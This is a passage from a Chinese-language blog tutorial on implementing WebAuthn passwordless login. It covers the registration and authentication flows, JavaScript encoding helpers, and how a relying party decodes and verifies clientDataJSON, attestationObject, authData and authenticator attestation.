个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 